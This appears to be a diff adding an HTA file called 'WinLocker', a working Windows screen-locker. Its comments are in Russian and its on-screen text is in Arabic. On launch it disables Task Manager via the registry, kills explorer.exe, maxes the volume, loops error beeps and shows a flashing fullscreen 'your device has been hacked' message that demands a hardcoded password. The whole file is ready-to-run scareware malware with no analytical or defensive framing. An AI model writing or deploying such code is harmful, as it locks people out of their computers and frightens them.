@@ -1,0 +1,108 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <hta:application id="WinLock"
+        applicationname="WinLocker"
+        border="none"
+        innerborder="no"
+        maximizebutton="no"
+        minimizebutton="no"
+        sysmenu="no"
+        scroll="no"
+        caption="no"
+    />
+    <script>
+        function disableTaskMgr() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", "1", "REG_DWORD");
+            } catch (e) {
+                alert("⚠ خطأ: ActiveX محظور!");
+            }
+        }
+
+        function killExplorer() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Run("taskkill /F /IM explorer.exe", 0, false);
+            } catch (e) {
+                alert("⚠ خطأ: ActiveX محظور!");
+            }
+        }
+
+        function checkUnlock() {
+            var pass = document.getElementById("password").value;
+            if (pass.toLowerCase() === "إلغاء القفل") {
+                try {
+                    var shell = new ActiveXObject("WScript.Shell");
+                    shell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", "0", "REG_DWORD");
+                    shell.Run("explorer.exe", 0, false);
+                } catch (e) {
+                    alert("⚠ خطأ: ActiveX محظور!");
+                }
+                window.close();
+            } else {
+                alert("❌ خطأ! كلمة المرور غير صحيحة!");
+            }
+        }
+
+        // Запуск ошибки с цикличным звуком
+        function loopErrorSound() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                // Используем стандартный звуковой сигнал Windows (Critical Message)
+                shell.Run("cmd /c echo ^G", 0, false); // Это вызовет звуковой сигнал (beep)
+                
+                setInterval(function() {
+                    shell.Run("cmd /c echo ^G", 0, false); // Повторяем каждую секунду
+                }, 1000);
+            } catch (e) {
+                alert("⚠ خطأ: ActiveX محظور!");
+            }
+        }
+
+        // Выставляем громкость на максимум
+        function setMaxVolume() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                for (var i = 0; i < 50; i++) {
+                    shell.SendKeys("{VOLUME_UP}");
+                }
+            } catch (e) {
+                alert("⚠ خطأ: Не удалось изменить громкость.");
+            }
+        }
+
+        // Инициализация
+        disableTaskMgr();
+        killExplorer();
+        setTimeout(setMaxVolume, 500); // Выставляем громкость на максимум
+        setTimeout(loopErrorSound, 1000); // Запускаем бесконечный звук ошибок
+    </script>
+</head>
+<body style="margin:0; background:black; color:red; text-align:center; font-family:'Arial', sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden;">
+    <div style="max-width:500px; padding:20px; background:#111; border-radius:10px; box-shadow:0 0 20px red;">
+        <h1 id="scaryText" style="color:red; font-size:40px; font-weight:bold;">⚠ لقد تم اختراق جهازك! ⚠</h1>
+        <p style="font-size:22px; color:white;">تم العثور على نشاط مشبوه. أدخل كلمة المرور لإلغاء القفل:</p>
+        <input type="text" id="password" style="padding:10px; font-size:22px; width:100%; text-align:center; border-radius:5px; border:none; outline:none;">
+        <br><br>
+        <button onclick="checkUnlock()" style="padding:15px 30px; font-size:22px; background:red; color:white; border:none; border-radius:5px; cursor:pointer;">🔓 إلغاء القفل</button>
+    </div>
+    <script>
+        window.resizeTo(screen.width, screen.height);
+        window.moveTo(0, 0);
+
+        function scaryEffect() {
+            var text = document.getElementById("scaryText");
+            text.style.visibility = (text.style.visibility == "hidden") ? "visible" : "hidden";
+        }
+        setInterval(scaryEffect, 500); // Мигание заголовка
+
+        function scaryBackground() {
+            var body = document.body;
+            body.style.backgroundColor = (body.style.backgroundColor === "black") ? "darkred" : "black";
+        }
+        setInterval(scaryBackground, 1000); // Мигание фона
+    </script>
+</body>
+</html>
